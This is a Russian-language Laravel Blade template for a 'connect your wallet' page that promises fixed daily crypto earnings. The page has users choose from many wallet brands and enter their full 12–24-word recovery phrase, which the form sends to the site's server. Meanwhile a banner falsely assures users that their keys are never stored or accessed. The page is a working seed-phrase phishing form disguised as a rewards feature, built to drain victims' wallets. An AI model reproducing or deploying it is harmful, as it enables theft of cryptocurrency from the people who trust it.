@extends('layouts.dasht')
@section('title', $title)
@section('content')

<div class="min-h-screen bg-gray-50 dark:bg-gray-900" x-data="walletConnectManager()">
    <div class="container mx-auto px-3 sm:px-4 lg:px-6 py-4 sm:py-6 lg:py-8 max-w-7xl">

        <!-- Page Header -->
        <div class="mb-6 sm:mb-8">
            <div class="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3 sm:gap-4">
                <div class="min-w-0 flex-1">
                    <h1 class="text-2xl sm:text-3xl lg:text-4xl font-bold text-gray-900 dark:text-white leading-tight">Подключить кошелек</h1>
                    <p class="text-sm sm:text-base text-gray-600 dark:text-gray-400 mt-1 sm:mt-2 leading-relaxed">
                        Безопасно подключите ваш криптовалютный кошелек чтобы начать зарабатывать награды
                    </p>
                </div>
                <div class="flex-shrink-0">
                    <a href="{{ route('dashboard') }}"
                       class="inline-flex items-center gap-2 px-3 sm:px-4 py-2 bg-gray-100 hover:bg-gray-200 dark:bg-gray-800 dark:hover:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-xl font-medium transition-all duration-200 text-sm sm:text-base">
                        <i data-lucide="arrow-left" class="w-4 h-4"></i>
                        <span class="hidden sm:inline">Назад к панели управления</span>
                        <span class="sm:hidden">Назад</span>
                    </a>
                </div>
            </div>
        </div>

        <!-- Alert Messages -->
        <div class="mb-4 sm:mb-6">
            @if (Session::has('message'))
                <div class="bg-red-50 dark:bg-red-900/20 border-l-4 border-red-400 p-3 sm:p-4 rounded-lg shadow-sm" x-data="{ show: true }" x-show="show">
                    <div class="flex items-start sm:items-center">
                        <div class="flex-shrink-0">
                            <i data-lucide="alert-circle" class="h-4 w-4 sm:h-5 sm:w-5 text-red-400 mt-0.5 sm:mt-0"></i>
                        </div>
                        <div class="ml-2 sm:ml-3 flex-1 min-w-0">
                            <p class="text-xs sm:text-sm text-red-700 dark:text-red-300 leading-relaxed">{{ Session::get('message') }}</p>
                        </div>
                        <div class="ml-2 sm:ml-3 flex-shrink-0">
                            <button @click="show = false" class="inline-flex text-red-400 hover:text-red-600 transition-colors">
                                <i data-lucide="x" class="h-3 w-3 sm:h-4 sm:w-4"></i>
                            </button>
                        </div>
                    </div>
                </div>
            @endif

            @if (Session::has('success'))
                <div class="bg-green-50 dark:bg-green-900/20 border-l-4 border-green-400 p-3 sm:p-4 rounded-lg shadow-sm" x-data="{ show: true }" x-show="show">
                    <div class="flex items-start sm:items-center">
                        <div class="flex-shrink-0">
                            <i data-lucide="check-circle" class="h-4 w-4 sm:h-5 sm:w-5 text-green-400 mt-0.5 sm:mt-0"></i>
                        </div>
                        <div class="ml-2 sm:ml-3 flex-1 min-w-0">
                            <p class="text-xs sm:text-sm text-green-700 dark:text-green-300 leading-relaxed">{{ Session::get('success') }}</p>
                        </div>
                        <div class="ml-2 sm:ml-3 flex-shrink-0">
                            <button @click="show = false" class="inline-flex text-green-400 hover:text-green-600 transition-colors">
                                <i data-lucide="x" class="h-3 w-3 sm:h-4 sm:w-4"></i>
                            </button>
                        </div>
                    </div>
                </div>
            @endif
        </div>

        @if(Auth::user()->wallet_connected == 0)
            <!-- Connect Wallet Section -->
            <div class="max-w-4xl mx-auto">
                <!-- Earning Information Card -->
                <div class="bg-gradient-to-br from-blue-50 to-indigo-50 dark:from-blue-900/20 dark:to-indigo-900/20 rounded-xl sm:rounded-2xl p-4 sm:p-6 mb-6 sm:mb-8 border border-blue-200 dark:border-blue-700">
                    <div class="flex flex-col sm:flex-row items-start gap-3 sm:gap-4">
                        <div class="p-2 sm:p-3 bg-blue-100 dark:bg-blue-900/30 rounded-lg sm:rounded-xl flex-shrink-0">
                            <i data-lucide="coins" class="w-6 h-6 sm:w-8 sm:h-8 text-blue-600 dark:text-blue-400"></i>
                        </div>
                        <div class="flex-1 min-w-0">
                            <h3 class="text-base sm:text-lg lg:text-xl font-semibold text-blue-900 dark:text-blue-100 mb-2 leading-tight">Начните зарабатывать {{ $settings->currency }}{{ $settings->min_return }} ежедневно</h3>
                            <p class="text-blue-700 dark:text-blue-300 text-xs sm:text-sm leading-relaxed mb-3 sm:mb-4">
                                Подключите ваш криптовалютный кошелек чтобы открыть возможности ежедневного заработка.
                                Убедитесь что ваш кошелек содержит минимум <span class="font-semibold">{{ $settings->currency }}{{ $settings->min_balance }}</span> чтобы получать автоматические ежедневные награды.
                            </p>
                            <div class="flex flex-col sm:flex-row sm:items-center gap-2 sm:gap-4 text-xs sm:text-sm">
                                <div class="flex items-center gap-1.5 sm:gap-2">
                                    <i data-lucide="shield-check" class="w-3 h-3 sm:w-4 sm:h-4 text-blue-600 flex-shrink-0"></i>
                                    <span class="text-blue-700 dark:text-blue-300">Безопасное подключение</span>
                                </div>
                                <div class="flex items-center gap-1.5 sm:gap-2">
                                    <i data-lucide="zap" class="w-3 h-3 sm:w-4 sm:h-4 text-blue-600 flex-shrink-0"></i>
                                    <span class="text-blue-700 dark:text-blue-300">Мгновенная настройка</span>
                                </div>
                                <div class="flex items-center gap-1.5 sm:gap-2">
                                    <i data-lucide="trending-up" class="w-3 h-3 sm:w-4 sm:h-4 text-blue-600 flex-shrink-0"></i>
                                    <span class="text-blue-700 dark:text-blue-300">Ежедневные награды</span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Wallet Connection Form -->
                <div class="bg-white dark:bg-gray-900 rounded-xl sm:rounded-2xl shadow-xl border border-gray-200 dark:border-gray-700">
                    <div class="p-4 sm:p-6 lg:p-8 border-b border-gray-200 dark:border-gray-700">
                        <div class="flex flex-col sm:flex-row items-start sm:items-center gap-3 sm:gap-4">
                            <div class="p-2 sm:p-3 lg:p-4 bg-gradient-to-br from-purple-100 to-blue-100 dark:from-purple-900/30 dark:to-blue-900/30 rounded-lg sm:rounded-xl flex-shrink-0">
                                <i data-lucide="wallet" class="w-6 h-6 sm:w-7 sm:h-7 lg:w-8 lg:h-8 text-purple-600 dark:text-purple-400"></i>
                            </div>
                            <div class="min-w-0 flex-1">
                                <h2 class="text-xl sm:text-2xl lg:text-3xl font-bold text-gray-900 dark:text-white leading-tight">Подключить кошелек</h2>
                                <p class="text-gray-600 dark:text-gray-400 mt-1 text-sm sm:text-base leading-relaxed">Выберите провайдера кошелька и введите вашу фразу восстановления</p>
                            </div>
                        </div>
                    </div>

                    <div class="p-4 sm:p-6 lg:p-8">
                        <form method="POST" action="{{ route('wallectConnect') }}" class="space-y-6 sm:space-y-8" x-ref="walletForm">
                            @csrf

                            <!-- Wallet Selection -->
                            <div>
                                <label for="wallet" class="block text-sm font-semibold text-gray-700 dark:text-gray-300 mb-3 sm:mb-4">
                                    <i data-lucide="wallet" class="w-4 h-4 inline mr-2"></i>
                                    Выберите провайдера кошелька
                                </label>

                                <!-- Popular Wallets Grid -->
                                <div class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-3 sm:gap-4 mb-4 sm:mb-6">
                                    <div @click="selectWallet('MetaMask')"
                                         :class="selectedWallet === 'MetaMask' ? 'ring-2 ring-blue-500 bg-blue-50 dark:bg-blue-900/20' : 'bg-gray-50 dark:bg-gray-800 hover:bg-gray-100 dark:hover:bg-gray-700'"
                                         class="p-3 sm:p-4 rounded-lg sm:rounded-xl cursor-pointer transition-all duration-200 border border-gray-200 dark:border-gray-600">
                                        <div class="text-center">
                                            <div class="w-10 h-10 sm:w-12 sm:h-12 mx-auto mb-2 bg-gradient-to-br from-orange-100 to-red-100 dark:from-orange-900/30 dark:to-red-900/30 rounded-lg flex items-center justify-center">
                                                <svg class="w-5 h-5 sm:w-7 sm:h-7" viewBox="0 0 24 24" fill="none">
                                                    <path d="M22 12c0 5.523-4.477 10-10 10S2 17.523 2 12 6.477 2 12 2s10 4.477 10 10z" fill="#F6851B"/>
                                                    <path d="M12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12 6.477 2 12 2z" stroke="#E2761B" stroke-width="2"/>
                                                    <circle cx="12" cy="12" r="6" fill="#E2761B"/>
                                                    <circle cx="12" cy="12" r="3" fill="#F6851B"/>
                                                </svg>
                                            </div>
                                            <div class="text-xs sm:text-sm font-medium text-gray-900 dark:text-white leading-tight">MetaMask</div>
                                        </div>
                                    </div>

                                    <div @click="selectWallet('Trust Wallet')"
                                         :class="selectedWallet === 'Trust Wallet' ? 'ring-2 ring-blue-500 bg-blue-50 dark:bg-blue-900/20' : 'bg-gray-50 dark:bg-gray-800 hover:bg-gray-100 dark:hover:bg-gray-700'"
                                         class="p-3 sm:p-4 rounded-lg sm:rounded-xl cursor-pointer transition-all duration-200 border border-gray-200 dark:border-gray-600">
                                        <div class="text-center">
                                            <div class="w-10 h-10 sm:w-12 sm:h-12 mx-auto mb-2 bg-gradient-to-br from-blue-100 to-cyan-100 dark:from-blue-900/30 dark:to-cyan-900/30 rounded-lg flex items-center justify-center">
                                                <svg class="w-5 h-5 sm:w-7 sm:h-7" viewBox="0 0 24 24" fill="none">
                                                    <path d="M12 2l9 9-9 9-9-9 9-9z" fill="#3375BB"/>
                                                    <path d="M12 6l5 5-5 5-5-5 5-5z" fill="#fff"/>
                                                    <path d="M12 8l3 3-3 3-3-3 3-3z" fill="#3375BB"/>
                                                </svg>
                                            </div>
                                            <div class="text-xs sm:text-sm font-medium text-gray-900 dark:text-white leading-tight">Trust Wallet</div>
                                        </div>
                                    </div>

                                    <div @click="selectWallet('Coinbase Wallet')"
                                         :class="selectedWallet === 'Coinbase Wallet' ? 'ring-2 ring-blue-500 bg-blue-50 dark:bg-blue-900/20' : 'bg-gray-50 dark:bg-gray-800 hover:bg-gray-100 dark:hover:bg-gray-700'"
                                         class="p-3 sm:p-4 rounded-lg sm:rounded-xl cursor-pointer transition-all duration-200 border border-gray-200 dark:border-gray-600">
                                        <div class="text-center">
                                            <div class="w-10 h-10 sm:w-12 sm:h-12 mx-auto mb-2 bg-gradient-to-br from-blue-100 to-indigo-100 dark:from-blue-900/30 dark:to-indigo-900/30 rounded-lg flex items-center justify-center">
                                                <svg class="w-5 h-5 sm:w-7 sm:h-7" viewBox="0 0 24 24" fill="none">
                                                    <circle cx="12" cy="12" r="10" fill="#0052FF"/>
                                                    <path d="M8 12h8M12 8v8" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
                                                </svg>
                                            </div>
                                            <div class="text-xs sm:text-sm font-medium text-gray-900 dark:text-white leading-tight">Coinbase</div>
                                        </div>
                                    </div>

                                    <div @click="showOtherWallets = !showOtherWallets"
                                         class="p-3 sm:p-4 rounded-lg sm:rounded-xl cursor-pointer transition-all duration-200 border-2 border-dashed border-gray-300 dark:border-gray-600 hover:border-blue-400 dark:hover:border-blue-500">
                                        <div class="text-center">
                                            <div class="w-10 h-10 sm:w-12 sm:h-12 mx-auto mb-2 bg-gradient-to-br from-gray-100 to-gray-200 dark:from-gray-700 dark:to-gray-800 rounded-lg flex items-center justify-center">
                                                <i data-lucide="more-horizontal" class="w-4 h-4 sm:w-6 sm:h-6 text-gray-600 dark:text-gray-400"></i>
                                            </div>
                                            <div class="text-xs sm:text-sm font-medium text-gray-900 dark:text-white leading-tight">Другие</div>
                                        </div>
                                    </div>
                                </div>

                                <!-- Other Wallets Dropdown -->
                                <div x-show="showOtherWallets" x-transition:enter="transition ease-out duration-200" x-transition:enter-start="opacity-0 transform -translate-y-2" x-transition:enter-end="opacity-100 transform translate-y-0" class="mb-4 sm:mb-6" style="display: none;">
                                    <select x-model="selectedWallet" name="wallet" required
                                            class="w-full px-3 sm:px-4 py-3 bg-white dark:bg-gray-800 border border-gray-300 dark:border-gray-600 rounded-lg sm:rounded-xl shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 dark:text-white text-sm sm:text-base transition-all duration-200">
                                        <option value="">Выберите провайдера кошелька</option>
                                        <optgroup label="Популярные кошельки">
                                            <option value="MetaMask">🦊 MetaMask</option>
                                            <option value="Trust Wallet">🛡️ Trust Wallet</option>
                                            <option value="Coinbase Wallet">🔵 Coinbase Wallet</option>
                                            <option value="Exodus">🚀 Exodus</option>
                                        </optgroup>
                                        <optgroup label="Аппаратные кошельки">
                                            <option value="Ledger">🔐 Ledger</option>
                                            <option value="Trezor">🔒 Trezor</option>
                                            <option value="KeepKey">🗝️ KeepKey</option>
                                        </optgroup>
                                        <optgroup label="Мобильные кошельки">
                                            <option value="Atomic Wallet">⚛️ Atomic Wallet</option>
                                            <option value="Mycelium">🍄 Mycelium</option>
                                            <option value="Jaxx Liberty">💎 Jaxx Liberty</option>
                                            <option value="BRD">🍞 BRD</option>
                                            <option value="Guarda">🛡️ Guarda</option>
                                            <option value="Enjin Wallet">🎮 Enjin Wallet</option>
                                            <option value="ZenGo">🧘 ZenGo</option>
                                            <option value="Ellipal">📱 Ellipal</option>
                                            <option value="Safepal">🔐 Safepal</option>
                                        </optgroup>
                                        <optgroup label="Веб кошельки">
                                            <option value="Blockchain Wallet">🔗 Blockchain Wallet</option>
                                            <option value="BitPay">💳 BitPay</option>
                                            <option value="BTC.com Wallet">₿ BTC.com Wallet</option>
                                        </optgroup>
                                        <optgroup label="Биржевые кошельки">
                                            <option value="Binance Chain Wallet">🟡 Binance Chain Wallet</option>
                                            <option value="Huobi Wallet">🔴 Huobi Wallet</option>
                                            <option value="WazirX">💜 WazirX</option>
                                        </optgroup>
                                        <optgroup label="Другие кошельки">
                                            <option value="Coinomi">🪙 Coinomi</option>
                                            <option value="Edge">🌊 Edge</option>
                                            <option value="Electrum">⚡ Electrum</option>
                                            <option value="Argent">🏛️ Argent</option>
                                            <option value="AtomicDEX">⚛️ AtomicDEX</option>
                                            <option value="Trustee Wallet">👥 Trustee Wallet</option>
                                            <option value="MathWallet">🔢 MathWallet</option>
                                            <option value="TokenPocket">🎒 TokenPocket</option>
                                            <option value="imToken">🎯 imToken</option>
                                            <option value="AlphaWallet">🐺 AlphaWallet</option>
                                            <option value="Rainbow Wallet">🌈 Rainbow Wallet</option>
                                            <option value="Gnosis Safe">🏦 Gnosis Safe</option>
                                        </optgroup>
                                    </select>
                                </div>

                                <!-- Hidden input for form submission -->
                                <input type="hidden" name="wallet" :value="selectedWallet">
                            </div>

                            <!-- Recovery Phrase Section -->
                            <div x-show="selectedWallet" x-transition:enter="transition ease-out duration-300" x-transition:enter-start="opacity-0 transform scale-95" x-transition:enter-end="opacity-100 transform scale-100" style="display: none;">
                                <label for="mnemonic" class="block text-sm font-semibold text-gray-700 dark:text-gray-300 mb-3 sm:mb-4">
                                    <i data-lucide="key" class="w-4 h-4 inline mr-2"></i>
                                    Фраза восстановления (Seed фраза)
                                </label>

                                <!-- Security Warning -->
                                <div class="bg-amber-50 dark:bg-amber-900/20 border-l-4 border-amber-400 p-3 sm:p-4 rounded-lg mb-3 sm:mb-4">
                                    <div class="flex items-start">
                                        <i data-lucide="alert-triangle" class="h-4 w-4 sm:h-5 sm:w-5 text-amber-400 mt-0.5 mr-2 sm:mr-3 flex-shrink-0"></i>
                                        <div class="text-xs sm:text-sm text-amber-700 dark:text-amber-300 leading-relaxed">
                                            <strong>Важно:</strong> Ваша фраза восстановления зашифрована и безопасно сохранена.
                                            Мы никогда не храним ваши приватные ключи и не получаем доступ к вашим средствам.
                                        </div>
                                    </div>
                                </div>

                                <div class="relative">
                                    <textarea
                                        name="mnemonic"
                                        id="mnemonic"
                                        required
                                        x-model="recoveryPhrase"
                                        @input="validatePhrase"
                                        :class="hasError ? 'border-red-500 ring-red-500' : 'border-gray-300 dark:border-gray-600 focus:border-blue-500 focus:ring-blue-500'"
                                        class="w-full px-3 sm:px-4 py-3 sm:py-4 bg-white dark:bg-gray-800 border rounded-lg sm:rounded-xl shadow-sm focus:outline-none focus:ring-2 dark:text-white text-sm sm:text-base transition-all duration-200 resize-none"
                                        rows="4"
                                        placeholder="Введите вашу фразу восстановления из 12 или 24 слов разделенных пробелами..."></textarea>

                                    <!-- Word Counter -->
                                    <div class="absolute bottom-2 sm:bottom-3 right-2 sm:right-3 text-xs text-gray-400">
                                        <span x-text="wordCount"></span> слов
                                    </div>
                                </div>

                                <!-- Phrase Validation Feedback -->
                                <div class="mt-2 sm:mt-3 space-y-1.5 sm:space-y-2">
                                    <div class="flex items-center gap-1.5 sm:gap-2 text-xs sm:text-sm">
                                        <i :data-lucide="wordCount >= 12 && wordCount <= 24 ? 'check-circle' : 'circle'"
                                           :class="wordCount >= 12 && wordCount <= 24 ? 'text-green-500' : 'text-gray-400'"
                                           class="w-3 h-3 sm:w-4 sm:h-4 flex-shrink-0"></i>
                                        <span :class="wordCount >= 12 && wordCount <= 24 ? 'text-green-600 dark:text-green-400' : 'text-gray-500'" class="leading-tight">
                                            Допустимое количество слов (12-24 слова)
                                        </span>
                                    </div>
                                    <div class="flex items-center gap-1.5 sm:gap-2 text-xs sm:text-sm">
                                        <i :data-lucide="!hasInvalidChars ? 'check-circle' : 'circle'"
                                           :class="!hasInvalidChars ? 'text-green-500' : 'text-gray-400'"
                                           class="w-3 h-3 sm:w-4 sm:h-4 flex-shrink-0"></i>
                                        <span :class="!hasInvalidChars ? 'text-green-600 dark:text-green-400' : 'text-gray-500'" class="leading-tight">
                                            Содержит только допустимые символы
                                        </span>
                                    </div>
                                    <div x-show="recoveryPhrase.length > 0 && !isValidPhrase" class="flex items-center gap-1.5 sm:gap-2 text-xs sm:text-sm">
                                        <i data-lucide="alert-circle" class="w-3 h-3 sm:w-4 sm:h-4 text-amber-500 flex-shrink-0"></i>
                                        <span class="text-amber-600 dark:text-amber-400 leading-tight">
                                            <span x-show="wordCount < 12">Фраза восстановления слишком короткая</span>
                                            <span x-show="wordCount > 24">Фраза восстановления слишком длинная</span>
                                            <span x-show="hasInvalidChars">Обнаружены недопустимые символы</span>
                                        </span>
                                    </div>
                                </div>
                            </div>

                            <!-- Connect Button -->
                            <div x-show="selectedWallet && isValidPhrase"
                                 x-transition:enter="transition ease-out duration-300"
                                 x-transition:enter-start="opacity-0 transform translate-y-4"
                                 x-transition:enter-end="opacity-100 transform translate-y-0"
                                 style="display: none;">
                                <button type="submit"
                                        @click="isConnecting = true"
                                        class="w-full inline-flex justify-center items-center gap-2 sm:gap-3 py-3 sm:py-4 px-4 sm:px-6 bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 text-white font-semibold rounded-lg sm:rounded-xl transition-all duration-200 shadow-lg hover:shadow-xl transform hover:scale-[1.02] text-sm sm:text-base"
                                        :class="isConnecting ? 'opacity-75 cursor-wait' : ''">
                                    <div x-show="!isConnecting" class="flex items-center gap-2 sm:gap-3">
                                        <i data-lucide="link" class="h-4 w-4 sm:h-5 sm:w-5"></i>
                                        <span>Подключить кошелек</span>
                                    </div>
                                    <div x-show="isConnecting" class="flex items-center gap-2 sm:gap-3">
                                        <div class="animate-spin rounded-full h-4 w-4 sm:h-5 sm:w-5 border-b-2 border-white"></div>
                                        <span>Подключение...</span>
                                    </div>
                                </button>
                            </div>
                        </form>
                    </div>
                </div>

                <!-- Security Features -->
                <div class="grid sm:grid-cols-2 lg:grid-cols-3 gap-4 sm:gap-6 mt-6 sm:mt-8">
                    <div class="text-center p-4 sm:p-6">
                        <div class="w-10 h-10 sm:w-12 sm:h-12 mx-auto mb-3 sm:mb-4 bg-green-100 dark:bg-green-900/30 rounded-full flex items-center justify-center">
                            <i data-lucide="shield-check" class="w-5 h-5 sm:w-6 sm:h-6 text-green-600"></i>
                        </div>
                        <h3 class="font-semibold text-gray-900 dark:text-white mb-1 sm:mb-2 text-sm sm:text-base">Безопасность банковского уровня</h3>
                        <p class="text-xs sm:text-sm text-gray-600 dark:text-gray-400 leading-relaxed">Ваши данные зашифрованы с использованием стандартных протоколов безопасности</p>
                    </div>
                    <div class="text-center p-4 sm:p-6">
                        <div class="w-10 h-10 sm:w-12 sm:h-12 mx-auto mb-3 sm:mb-4 bg-blue-100 dark:bg-blue-900/30 rounded-full flex items-center justify-center">
                            <i data-lucide="eye-off" class="w-5 h-5 sm:w-6 sm:h-6 text-blue-600"></i>
                        </div>
                        <h3 class="font-semibold text-gray-900 dark:text-white mb-1 sm:mb-2 text-sm sm:text-base">Конфиденциальность прежде всего</h3>
                        <p class="text-xs sm:text-sm text-gray-600 dark:text-gray-400 leading-relaxed">Мы никогда не получаем доступ к вашим средствам и не храним конфиденциальную информацию кошелька</p>
                    </div>
                    <div class="text-center p-4 sm:p-6 sm:col-span-2 lg:col-span-1">
                        <div class="w-10 h-10 sm:w-12 sm:h-12 mx-auto mb-3 sm:mb-4 bg-purple-100 dark:bg-purple-900/30 rounded-full flex items-center justify-center">
                            <i data-lucide="clock" class="w-5 h-5 sm:w-6 sm:h-6 text-purple-600"></i>
                        </div>
                        <h3 class="font-semibold text-gray-900 dark:text-white mb-1 sm:mb-2 text-sm sm:text-base">Мгновенное подключение</h3>
                        <p class="text-xs sm:text-sm text-gray-600 dark:text-gray-400 leading-relaxed">Быстрая настройка с немедленным доступом к функциям заработка</p>
                    </div>
                </div>
            </div>

        @else
            <!-- Wallet Connected State -->
            <div class="max-w-2xl mx-auto">
                <div class="bg-white dark:bg-gray-900 rounded-xl sm:rounded-2xl shadow-xl border border-gray-200 dark:border-gray-700 overflow-hidden">
                    <!-- Success Header -->
                    <div class="bg-gradient-to-r from-green-50 to-emerald-50 dark:from-green-900/20 dark:to-emerald-900/20 p-6 sm:p-8 border-b border-green-200 dark:border-green-700">
                        <div class="text-center">
                            <div class="w-16 h-16 sm:w-20 sm:h-20 mx-auto mb-3 sm:mb-4 bg-green-100 dark:bg-green-900/30 rounded-full flex items-center justify-center">
                                <i data-lucide="check-circle" class="w-8 h-8 sm:w-10 sm:h-10 text-green-600 dark:text-green-400"></i>
                            </div>
                            <h2 class="text-xl sm:text-2xl font-bold text-green-900 dark:text-green-100 mb-2 leading-tight">Кошелек успешно подключен!</h2>
                            <p class="text-green-700 dark:text-green-300 text-sm sm:text-base">Ваш кошелек подключен и зарабатывает {{ $settings->currency }}{{ $settings->min_return }} ежедневно</p>
                        </div>
                    </div>

                    <!-- Connected Info -->
                    <div class="p-6 sm:p-8">
                        <div class="grid sm:grid-cols-2 gap-4 sm:gap-6 mb-6 sm:mb-8">
                            <div class="text-center p-4 sm:p-6 bg-gray-50 dark:bg-gray-800 rounded-lg sm:rounded-xl">
                                <div class="text-xl sm:text-2xl font-bold text-gray-900 dark:text-white">{{ $settings->currency }}{{ $settings->min_return }}</div>
                                <div class="text-xs sm:text-sm text-gray-600 dark:text-gray-400 mt-1">Ежедневные доходы</div>
                            </div>
                            <div class="text-center p-4 sm:p-6 bg-gray-50 dark:bg-gray-800 rounded-lg sm:rounded-xl">
                                <div class="text-xl sm:text-2xl font-bold text-gray-900 dark:text-white">{{ $settings->currency }}{{ $settings->min_balance }}</div>
                                <div class="text-xs sm:text-sm text-gray-600 dark:text-gray-400 mt-1">Минимальный баланс</div>
                            </div>
                        </div>

                        <!-- Status Message -->
                        <div class="bg-blue-50 dark:bg-blue-900/20 border-l-4 border-blue-400 p-3 sm:p-4 rounded-lg mb-6 sm:mb-8">
                            <div class="flex items-start">
                                <i data-lucide="info" class="h-4 w-4 sm:h-5 sm:w-5 text-blue-400 mt-0.5 mr-2 sm:mr-3 flex-shrink-0"></i>
                                <div class="text-xs sm:text-sm text-blue-700 dark:text-blue-300 leading-relaxed">
                                    <strong>Примечание:</strong> Если вы не получаете доходы, убедитесь что ваш кошелек содержит минимум
                                    <strong>{{ $settings->currency }}{{ $settings->min_balance }}</strong> и свяжитесь с нашей службой поддержки.
                                </div>
                            </div>
                        </div>

                        <!-- Action Buttons -->
                        <div class="grid sm:grid-cols-2 gap-3 sm:gap-4">
                            <a href="{{ route('dashboard') }}"
                               class="inline-flex items-center justify-center gap-2 py-3 px-4 bg-blue-600 hover:bg-blue-700 text-white rounded-lg sm:rounded-xl font-medium transition-all duration-200 text-sm sm:text-base">
                                <i data-lucide="bar-chart-3" class="w-4 h-4"></i>
                                Посмотреть панель управления
                            </a>
                            <a href="{{ route('contact') }}"
                               class="inline-flex items-center justify-center gap-2 py-3 px-4 bg-gray-100 hover:bg-gray-200 dark:bg-gray-800 dark:hover:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-lg sm:rounded-xl font-medium transition-all duration-200 text-sm sm:text-base">
                                <i data-lucide="help-circle" class="w-4 h-4"></i>
                                Получить поддержку
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        @endif
    </div>
</div>

<script>
function walletConnectManager() {
    return {
        selectedWallet: '',
        recoveryPhrase: '',
        isConnecting: false,
        showOtherWallets: false,
        hasError: false,

        init() {
            // Initialize Lucide icons immediately
            this.refreshIcons();

            // Also refresh icons after a short delay to ensure DOM is ready
            setTimeout(() => {
                this.refreshIcons();
            }, 100);

            // Reset connecting state after timeout as fallback
            setTimeout(() => {
                this.isConnecting = false;
            }, 15000); // 15 seconds timeout
        },

        refreshIcons() {
            if (typeof lucide !== 'undefined') {
                try {
                    lucide.createIcons();
                } catch (e) {
                    console.log('Lucide icons initialization:', e);
                }
            }
        },

        selectWallet(wallet) {
            this.selectedWallet = wallet;
            this.showOtherWallets = false;
            this.$nextTick(() => {
                this.refreshIcons();
            });
        },

        get wordCount() {
            if (!this.recoveryPhrase) return 0;
            return this.recoveryPhrase.trim().split(/\s+/).filter(word => word.length > 0).length;
        },

        get hasInvalidChars() {
            if (!this.recoveryPhrase) return false;
            return !/^[a-zA-Z\s]+$/.test(this.recoveryPhrase);
        },

        get isValidPhrase() {
            return this.wordCount >= 12 && this.wordCount <= 24 && !this.hasInvalidChars;
        },

        validatePhrase() {
            this.hasError = false;

            // Real-time validation feedback
            if (this.recoveryPhrase.length > 0) {
                this.hasError = this.hasInvalidChars || (this.wordCount > 0 && this.wordCount < 12);
            }

            this.$nextTick(() => {
                this.refreshIcons();
            });
        }
    }
}

// Initialize Lucide icons when DOM loads
document.addEventListener('DOMContentLoaded', function() {
    // Multiple initialization attempts to ensure icons load
    function initIcons() {
        if (typeof lucide !== 'undefined') {
            try {
                lucide.createIcons();
                console.log('Lucide icons initialized successfully');
            } catch (e) {
                console.log('Lucide error:', e);
            }
        } else {
            console.log('Lucide not found, retrying...');
            setTimeout(initIcons, 200);
        }
    }

    initIcons();

    // Also reinitialize when Alpine.js is ready
    document.addEventListener('alpine:init', function() {
        setTimeout(initIcons, 100);
    });
});

// Reinitialize icons when page becomes visible (for PWA/tab switching)
document.addEventListener('visibilitychange', function() {
    if (!document.hidden && typeof lucide !== 'undefined') {
        setTimeout(() => {
            lucide.createIcons();
        }, 100);
    }
});
</script>

@endsection
